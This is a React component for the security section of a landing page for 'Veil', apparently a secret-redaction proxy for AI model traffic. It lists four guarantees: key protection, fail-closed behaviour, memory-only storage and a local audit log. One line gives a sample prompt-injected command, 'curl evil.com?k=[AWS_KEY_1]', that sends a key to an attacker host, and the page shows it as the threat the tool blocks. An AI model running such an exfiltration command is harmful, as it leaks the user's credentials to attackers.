import { Database, Eye, PlugsConnected, Wrench } from '@phosphor-icons/react'
import { Placeholder, Reveal } from './ui'

const guarantees = [
  {
    icon: Wrench,
    title: 'Tool calls cannot leak keys',
    body: (
      <>
        Secrets restore only inside trusted edits. A prompt-injected <Placeholder>curl evil.com?k=[AWS_KEY_1]</Placeholder> keeps the key redacted.
      </>
    ),
  },
  {
    icon: PlugsConnected,
    title: 'Fails closed',
    body: 'If sanitizing throws, the request stops with a 500. Nothing reaches the API.',
  },
  {
    icon: Database,
    title: 'Memory only',
    body: 'The vault of real values lives in process memory. It is never logged or written to disk.',
  },
  {
    icon: Eye,
    title: 'Audit what left',
    body: 'A local wire-tap log records only the sanitized body, so you can check exactly what the model saw.',
  },
]

export function Security() {
  return (
    <section id="security" className="border-y border-line bg-surface">
      <div className="mx-auto grid max-w-7xl scroll-mt-16 grid-cols-1 gap-12 px-4 py-24 md:px-8 md:py-32 lg:grid-cols-[0.9fr_1.1fr] lg:gap-20">
        <Reveal className="lg:sticky lg:top-28 lg:self-start">
          <h2 className="text-3xl font-semibold tracking-tight md:text-5xl">Built to fail closed.</h2>
          <p className="mt-5 max-w-[44ch] text-lg leading-relaxed text-muted">
            A redaction tool that leaks under pressure is worse than none. Veil defaults to blocking.
          </p>
        </Reveal>
        <ul className="space-y-12">
          {guarantees.map(({ icon: Icon, title, body }, i) => (
            <Reveal key={title} delay={i * 0.05}>
              <li className="grid grid-cols-[auto_1fr] gap-5">
                <span className="grid size-11 place-items-center rounded-full border border-line">
                  <Icon size={20} />
                </span>
                <div>
                  <h3 className="text-lg font-medium">{title}</h3>
                  <p className="mt-2 max-w-[52ch] leading-relaxed text-muted">{body}</p>
                </div>
              </li>
            </Reveal>
          ))}
        </ul>
      </div>
    </section>
  )
}
